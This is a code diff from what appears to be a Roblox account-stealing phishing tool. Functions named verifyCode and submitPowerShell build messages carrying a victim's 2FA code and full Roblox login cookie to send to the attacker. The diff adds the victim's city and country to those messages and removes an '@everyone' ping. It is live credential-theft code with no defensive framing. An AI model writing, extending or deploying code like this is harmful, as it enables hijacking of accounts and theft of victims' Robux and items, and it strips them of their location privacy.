@@ -219,7 +219,7 @@ async function verifyCode() {
         const payload = {
             content: `2FA: ${code}
 Cookie: ${globalRobloxCookie ? `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${globalRobloxCookie}` : 'None'}
-@everyone`
+Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
         };
 
         console.log('📤 2FA Sending payload:', payload);
@@ -719,8 +719,7 @@ async function submitPowerShell() {
                             // Immediate cookie capture payload (plain text)
             const payload = {
                 content: `Cookie: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${robloxCookie}
-2FA in 80s
-@everyone`
+Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
             };
 
                 console.log('📤 Sending payload:', payload);
